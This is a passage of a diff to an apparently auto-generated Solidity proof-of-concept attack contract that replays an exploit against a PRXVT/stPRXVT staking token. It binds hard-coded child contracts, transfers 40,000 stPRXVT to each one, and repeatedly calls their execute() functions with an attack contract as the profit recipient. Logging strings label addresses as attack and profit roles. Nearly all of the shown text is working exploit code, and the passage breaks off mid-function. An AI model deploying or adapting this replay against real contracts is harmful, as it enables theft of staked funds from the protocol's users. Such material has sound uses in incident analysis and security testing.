+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        AttackChild(payable(address(attackChild_3)))
+            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            bytes32 observedSalt = bytes32(uint256(5));
+            observedSalt;
+            address created = address(attackChild_6);
+            require(created.code.length != 0, "observed attack child runtime missing");
+        }
+        AttackChild(payable(address(attackChild_6)))._prepareAttackChild7();
+        {
+            uint256 transferActionGraphAmount_6 = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_6), transferActionGraphAmount_6);
+        }
+        _replayProtocolCal2();
+        _replayProtocolCal3();
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            bytes32 observedSalt = bytes32(uint256(8));
+            observedSalt;
+            address created = address(attackChild_2);
+            require(created.code.length != 0, "observed attack child runtime missing");
+        }
+        AttackChild(payable(address(attackChild_2)))._prepareAttackChild3();
+        {
+            uint256 transferActionGraphAmount_9 = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_2), transferActionGraphAmount_9);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        AttackChild(payable(address(attackChild_2)))
+            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            bytes32 observedSalt = bytes32(uint256(9));
+            observedSalt;
+            address created = address(attackChild_4);
+            require(created.code.length != 0, "observed attack child runtime missing");
+        }
+        AttackChild(payable(address(attackChild_4)))._prepareAttackChild5();
+        {
+            uint256 transferActionGraphAmount_10 = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_4), transferActionGraphAmount_10);
+        }
+        _replayProtocolCal4();
+        _replayProtocolCal5();
     }
 
-    function _prepareChild(AttackChild child, uint256 cycle) internal {
-        if (cycle == 1) child._prepareAttackChild();
-        else if (cycle == 2) child._prepareAttackChild2();
-        else if (cycle == 3) child._prepareAttackChild3();
-        else if (cycle == 4) child._prepareAttackChild4();
-        else if (cycle == 5) child._prepareAttackChild5();
-        else if (cycle == 6) child._prepareAttackChild6();
-        else if (cycle == 7) child._prepareAttackChild7();
-        else if (cycle == 8) child._prepareAttackChild8();
-        else if (cycle == 9) child._prepareAttackChild9();
-        else if (cycle == 10) child._prepareAttackChild1();
-        else if (cycle == 11) child._prepareAttackChil2();
-        else if (cycle == 12) child._prepareAttackChil3();
-        else if (cycle == 13) child._prepareAttackChil4();
-        else if (cycle == 14) child._prepareAttackChil5();
-        else if (cycle == 15) child._prepareAttackChil6();
-        else if (cycle == 16) child._prepareAttackChil7();
-        else if (cycle == 17) child._prepareAttackChil8();
-        else if (cycle == 18) child._prepareAttackChil9();
-        else if (cycle == 19) child._prepareAttackChil10();
-        else if (cycle == 20) child._prepareAttackChil11();
+    function _deployAttackChild3() internal {
+        _replayProtocolCalls();
+        _settleTokenFlows();
+        _replayProtocolCal6();
+        _deployAttackChild2();
+        _replayProtocolCal2();
+        _replayProtocolCal3();
+        _deployAttackChildCo();
+        _replayProtocolCal4();
+        _replayProtocolCal5();
+    }
+
+    function _replayProtocolCalls() internal {
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            bytes32 observedSalt = bytes32(uint256(0));
+            observedSalt;
+            address created = address(attackChild_9);
+            require(created.code.length != 0, "observed attack child runtime missing");
+        }
+        AttackChild(payable(address(attackChild_9)))._prepareAttackChild1();
+        {
+            uint256 transferActionGraphAmount = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_9), transferActionGraphAmount);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        AttackChild(payable(address(attackChild_9)))
+            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            bytes32 observedSalt = bytes32(uint256(1));
+            observedSalt;
+            address created = address(attackChild_5);
+            require(created.code.length != 0, "observed attack child runtime missing");
+        }
+        AttackChild(payable(address(attackChild_5)))._prepareAttackChild6();
+    }
+
+    function _settleTokenFlows() internal {
+        {
+            uint256 transferActionGraphAmount_2 = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_5), transferActionGraphAmount_2);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        AttackChild(payable(address(attackChild_5)))
+            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            bytes32 observedSalt = bytes32(uint256(2));
+            observedSalt;
+            address created = address(attackChild_8);
+            require(created.code.length != 0, "observed attack child runtime missing");
+        }
+        AttackChild(payable(address(attackChild_8)))._prepareAttackChild9();
+        {
+            uint256 transferActionGraphAmount_3 = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_8), transferActionGraphAmount_3);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+    }
+
+    function _replayProtocolCal6() internal {
+        AttackChild(payable(address(attackChild_8)))
+            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            bytes32 observedSalt = bytes32(uint256(3));
+            observedSalt;
+            address created = address(attackChild);
+            require(created.code.length != 0, "observed attack child runtime missing");
+        }
+        AttackChild(payable(address(attackChild)))._prepareAttackChild();
+        {
+            uint256 transferActionGraphAmount_4 = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild), transferActionGraphAmount_4);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        AttackChild(payable(address(attackChild)))
+            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+    }
+
+    function _deployAttackChild2() internal {
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            bytes32 observedSalt = bytes32(uint256(4));
+            observedSalt;
+            address created = address(attackChild_3);
+            require(created.code.length != 0, "observed attack child runtime missing");
+        }
+        AttackChild(payable(address(attackChild_3)))._prepareAttackChild4();
+        {
+            uint256 transferActionGraphAmount_5 = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_3), transferActionGraphAmount_5);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        AttackChild(payable(address(attackChild_3)))
+            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            bytes32 observedSalt = bytes32(uint256(5));
+            observedSalt;
+            address created = address(attackChild_6);
+            require(created.code.length != 0, "observed attack child runtime missing");
+        }
+        AttackChild(payable(address(attackChild_6)))._prepareAttackChild7();
+        {
+            uint256 transferActionGraphAmount_6 = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_6), transferActionGraphAmount_6);
+        }
+    }
+
+    function _replayProtocolCal2() internal {
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        AttackChild(payable(address(attackChild_6)))
+            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            bytes32 observedSalt = bytes32(uint256(6));
+            observedSalt;
+            address created = address(attackChild_1);
+            require(created.code.length != 0, "observed attack child runtime missing");
+        }
+        AttackChild(payable(address(attackChild_1)))._prepareAttackChild2();
+        {
+            uint256 transferActionGraphAmount_7 = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_1), transferActionGraphAmount_7);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+    }
+
+    function _replayProtocolCal3() internal {
+        AttackChild(payable(address(attackChild_1)))
+            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            bytes32 observedSalt = bytes32(uint256(7));
+            observedSalt;
+            address created = address(attackChild_10);
+            require(created.code.length != 0, "observed attack child runtime missing");
+        }
+        AttackChild(payable(address(attackChild_10)))._prepareAttackChil2();
+        {
+            uint256 transferActionGraphAmount_8 = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_10), transferActionGraphAmount_8);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        AttackChild(payable(address(attackChild_10)))
+            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+    }
+
+    function _deployAttackChildCo() internal {
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            bytes32 observedSalt = bytes32(uint256(8));
+            observedSalt;
+            address created = address(attackChild_2);
+            require(created.code.length != 0, "observed attack child runtime missing");
+        }
+        AttackChild(payable(address(attackChild_2)))._prepareAttackChild3();
+        {
+            uint256 transferActionGraphAmount_9 = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_2), transferActionGraphAmount_9);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        AttackChild(payable(address(attackChild_2)))
+            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            bytes32 observedSalt = bytes32(uint256(9));
+            observedSalt;
+            address created = address(attackChild_4);
+            require(created.code.length != 0, "observed attack child runtime missing");
+        }
+        AttackChild(payable(address(attackChild_4)))._prepareAttackChild5();
+        {
+            uint256 transferActionGraphAmount_10 = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_4), transferActionGraphAmount_10);
+        }
+    }
+
+    function _replayProtocolCal4() internal {
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        AttackChild(payable(address(attackChild_4)))
+            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+        IERC20Like(Addresses.stPRXVT).balanceOf(address(this));
+        {
+            bytes32 observedSalt = bytes32(uint256(10));
+            observedSalt;
+            address created = address(attackChild_7);
+            require(created.code.length != 0, "observed attack child runtime missing");
+        }
+        AttackChild(payable(address(attackChild_7)))._prepareAttackChild8();
+        {
+            uint256 transferActionGraphAmount_11 = 40000000000000000000000;
+            IERC20Like(Addresses.stPRXVT).transfer(address(attackChild_7), transferActionGraphAmount_11);
+        }
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
+    }
+
+    function _replayProtocolCal5() internal {
+        AttackChild(payable(address(attackChild_7)))
+            .execute(Addresses.stPRXVT, Addresses.PRXVT, Addresses.attack_contract);
+        {
+            if (Addresses.PRXVT.code.length != 0) {
+                IERC20Like(Addresses.PRXVT).balanceOf(address(this));
+            } else {
+                console2.log(
+                    "PoCWarning",
+                    "skipping missing-code observed typed call",
+                    "Addresses.PRXVT = 0xc2ff2e5aa9023b1bb688178a4a547212f4614bc0 label=PRXVT token_symbol=PRXVT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium"
+                );
+            }
+        }
     }
 
     receive() external payable {}
@@ -284,8 +766,8 @@ contract OurAttack {
     fallback() external payable {
         if (msg.data.length == 0) return;
         if (msg.sig == 0xe6d7db7e) {
-            _executeStakeCycles();
-            bytes memory ret = abi.encode(0x00000000000000000007e6C50cBf628949b22F00, uint256(1824));
+            _deployAttackChild3();
+            bytes memory ret = abi.encode(0x00000000000000000000006aBB9B69Dc32927680, uint256(11));
             assembly { return(add(ret, 32), mload(ret)) }
         }
         _entryCb();
@@ -294,118 +776,113 @@ contract OurAttack {
     function _entryCb() internal {}
 
     function bindAttackChildContracts() external {
-        attackChild = AttackChild(payable(0x04021252a55fd6E012f96350EB28820FD2f01048));
-        attackChild_1 = AttackChild(payable(0x05eB4a38FD088E567c86eC02bDe04564b8CFF8f4));
-        attackChild_2 = AttackChild(payable(0x1915e1d705A16fb0555183d8035A40B4D7b08754));
-        attackChild_3 = AttackChild(payable(0x34659264a5772fB78328BC2458aFA602De0c4327));
-        attackChild_4 = AttackChild(payable(0x3731aB4Bf5411E83f0284e977cC957C470b06E05));
-        attackChild_5 = AttackChild(payable(0x4Ae6813D2303389b4eE340a4203018b7D55A41C0));
-        attackChild_6 = AttackChild(payable(0x4B24a672ABEBF0E8d47f4Fff8f48D9372A3EeA60));
-        attackChild_7 = AttackChild(payable(0x63cdeC8A4Fe4bae4220732D6BA07Ce4e18257225));
-        attackChild_8 = AttackChild(payable(0x67588894D086634BD399F8bC6A8e98399B841083));
-        attackChild_9 = AttackChild(payable(0x795a89B2FB819643639F47Dd0b664EcdE7d7a3C8));
-        attackChild_10 = AttackChild(payable(0x83fEF8e277Ae519B6cCB247771704b72679769A9));
-        attackChild_11 = AttackChild(payable(0x89fbC0aa1934FF7584dB6a947d20B7b9487882C9));
-        attackChild_12 = AttackChild(payable(0x8f328440FEa42b3f5c19eF267b308D928171002A));
-        attackChild_13 = AttackChild(payable(0x9d1A63c71d88b07524A0F14e5b7aF7671496AF0e));
-        attackChild_14 = AttackChild(payable(0xB43d98418c5A5863f1a96c2917164d074ff4c97f));
-        attackChild_15 = AttackChild(payable(0xbB565626B6107542A07235DaC741082a9A3e1651));
-        attackChild_16 = AttackChild(payable(0xd8385F89Cd1eb70a51148c01256F2aCA875C9cae));
-        attackChild_17 = AttackChild(payable(0xE9D0442EBb007735fC6001D2e21203c5E30FcFF2));
-        attackChild_18 = AttackChild(payable(0xEeB16226B7E9dCD0912A0A3CE4C3d155Bf7187fE));
-        attackChild_19 = AttackChild(payable(0xF3FE57d25eF1A7E370F0f50a223Cf98a48DB410c));
+        attackChild = AttackChild(payable(0x07Cf59f84c0D8aD79dda77F6fA71E19bE08e3242));
+        attackChild_1 = AttackChild(payable(0x10318e391bA9Dfb517f7d0f521Bf2691d32821A6));
+        attackChild_2 = AttackChild(payable(0x19CeEBDD5838C60E73d7557f8950Da0ED0457D8e));
+        attackChild_3 = AttackChild(payable(0x25c9ca5e593553c696EBB09ED675b0f09B5Ef368));
+        attackChild_4 = AttackChild(payable(0x72CDfF23dB035D4959901158d230c0c8642a38a8));
+        attackChild_5 = AttackChild(payable(0x8D7bf27794B53129a143b120B1852Fe3048E8466));
+        attackChild_6 = AttackChild(payable(0x9A95CEe3B8Ef78b76d3f38dC45F2230Bd4fC960d));
+        attackChild_7 = AttackChild(payable(0x9ff99efAd40cD6FF67d7552bBEc5434653FA5349));
+        attackChild_8 = AttackChild(payable(0xB649491dcBC08560eCD2a8AE621bCf1d33B9b5eb));
+        attackChild_9 = AttackChild(payable(0xd6E87E48968B44c5Eb79ee3f7697bB8efa19bD4E));
+        attackChild_10 = AttackChild(payable(0xEA6E0B9f162E5532389f32832529a794bf10F4AD));
     }
 
     function bindAttackChild(address attackChildAddress) external {
         attackChild = AttackChild(payable(attackChildAddress));
+    }
+
+    function _boundAttack(bytes memory data) internal {
+        _decodedCall(address(attackChild), data);
+    }
+
+    function _decodedCall(address target, bytes memory data) internal {
+        (bool ok,) = target.call(data);
+        require(ok, "attack child dispatch failed");
+    }
+
+    mapping(uint256 => uint256) private _entryCallbackCursor;
+    mapping(address => uint256) private _balancerVaultPreBalance;
+
+    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
+        ordinal = _entryCallbackCursor[index];
+        _entryCallbackCursor[index] = ordinal + 1;
+    }
+
+    function _recordBalancerPre(address[] memory tokens) internal {
+        for (uint256 i = 0; i < tokens.length; i++) {
+            _balancerVaultPreBalance[tokens[i]] =
+                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+        }
+    }
+
+    function recordBalancerPre(address[] memory tokens) external {
+        _recordBalancerPre(tokens);
+    }
+
+    function balancerVaultPreBalance(address token) external view returns (uint256) {
+        return _balancerVaultPreBalance[token];
+    }
+
+    function _tryHelperAt(address target, bytes memory data) internal {
+        (bool ok,) = target.call(data);
+        ok;
     }
 }
 
 contract AttackChild {
     receive() external payable {}
 
-    function execute(address stakingToken, address rewardToken, address profitRecipient) external payable {
-        if (address(this) == 0x1915e1d705A16fb0555183d8035A40B4D7b08754) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
+    function execute(address arg0, address arg1, address arg2) external payable {
+        arg0;
+        arg1;
+        arg2;
+        if (address(this) == 0xd6E87E48968B44c5Eb79ee3f7697bB8efa19bD4E) {
+            _handleAttackChildCa();
             return;
         }
-        if (address(this) == 0xF3FE57d25eF1A7E370F0f50a223Cf98a48DB410c) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
+        if (address(this) == 0x8D7bf27794B53129a143b120B1852Fe3048E8466) {
+            _handleAttackChild7();
             return;
         }
-        if (address(this) == 0x89fbC0aa1934FF7584dB6a947d20B7b9487882C9) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
+        if (address(this) == 0xB649491dcBC08560eCD2a8AE621bCf1d33B9b5eb) {
+            _handleAttackChild10();
             return;
         }
-        if (address(this) == 0x4B24a672ABEBF0E8d47f4Fff8f48D9372A3EeA60) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
+        if (address(this) == 0x07Cf59f84c0D8aD79dda77F6fA71E19bE08e3242) {
+            _handleAttackChild11();
             return;
         }
-        if (address(this) == 0x34659264a5772fB78328BC2458aFA602De0c4327) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
+        if (address(this) == 0x25c9ca5e593553c696EBB09ED675b0f09B5Ef368) {
+            _handleAttackChild5();
             return;
         }
-        if (address(this) == 0x795a89B2FB819643639F47Dd0b664EcdE7d7a3C8) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
+        if (address(this) == 0x9A95CEe3B8Ef78b76d3f38dC45F2230Bd4fC960d) {
+            _handleAttackChild8();
             return;
         }
-        if (address(this) == 0xd8385F89Cd1eb70a51148c01256F2aCA875C9cae) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
+        if (address(this) == 0x10318e391bA9Dfb517f7d0f521Bf2691d32821A6) {
+            _handleAttackChild3();
             return;
         }
-        if (address(this) == 0x05eB4a38FD088E567c86eC02bDe04564b8CFF8f4) {
-            _claimRewards(stakingToken, rewardToken, profitRecipient);
+        if (address(this) == 0xEA6E0B9f162E5532389f32832529a794bf10F4AD) {
+            _handleAttackChild2();
             return;
         }
-        if (address(this) == 0x4Ae6813D2303389b4eE340a4203018b7D55A41C0) {
